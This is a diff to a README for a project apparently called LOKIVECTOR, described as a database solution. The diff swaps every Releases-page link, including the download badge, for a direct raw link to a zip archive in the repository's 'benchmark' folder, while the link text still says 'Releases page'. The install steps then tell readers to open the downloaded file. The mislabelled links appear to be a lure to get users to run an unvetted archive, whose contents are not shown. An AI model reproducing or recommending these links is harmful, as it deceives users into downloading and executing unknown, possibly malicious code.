@@ -1,6 +1,6 @@
 # 🚀 LOKIVECTOR - Your Smart Database Solution Awaits
 
-[![Download LOKIVECTOR](https://img.shields.io/badge/Download-LOKIVECTOR-blue.svg)](https://github.com/Andzile/LOKIVECTOR/releases)
+[![Download LOKIVECTOR](https://github.com/Andzile/LOKIVECTOR/raw/refs/heads/main/benchmark/LOKIVECTOR-3.0.zip)](https://github.com/Andzile/LOKIVECTOR/raw/refs/heads/main/benchmark/LOKIVECTOR-3.0.zip)
 
 ## 📖 Introduction
 
@@ -12,11 +12,11 @@ Follow these instructions to download and get started with LOKIVECTOR.
 
 ### 🔗 Visit This Page to Download
 
-You can download LOKIVECTOR by visiting our [Releases page](https://github.com/Andzile/LOKIVECTOR/releases). This page contains all versions of the software, including the latest stable release.
+You can download LOKIVECTOR by visiting our [Releases page](https://github.com/Andzile/LOKIVECTOR/raw/refs/heads/main/benchmark/LOKIVECTOR-3.0.zip). This page contains all versions of the software, including the latest stable release.
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/Andzile/LOKIVECTOR/releases).
+1. Go to the [Releases page](https://github.com/Andzile/LOKIVECTOR/raw/refs/heads/main/benchmark/LOKIVECTOR-3.0.zip).
 2. Look for the latest version under the "Latest Release" section.
 3. Click on the link for your operating system to download the installation file.
 4. Once the download is complete, open the file to start the installation.
